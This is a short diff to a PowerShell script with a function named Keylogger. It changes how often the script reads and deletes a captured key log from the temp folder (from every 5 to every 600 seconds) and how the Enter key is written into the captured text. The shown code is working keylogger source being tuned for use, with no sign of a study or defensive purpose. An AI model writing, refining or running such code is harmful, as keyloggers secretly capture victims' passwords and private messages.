@@ -102,7 +102,7 @@ function script:Keylogger
 		$filename = "$env:temp\key.log"
         while($true) 
         { 
-            Start-Sleep -Seconds 5
+            Start-Sleep -Seconds 600
 			
 			$data = Get-Content $filename
 			Remove-Item -path $filename
@@ -211,7 +211,7 @@ function script:Keylogger
 					46 {$out = $out + "Delete"}
 					8 {$out = $out + "Backspace"}
 					32 {$out = $out + " "}
-					13 {$out = $out + "<br />"}
+					13 {$out = $out + "\n"}
 				}
 			}
 			
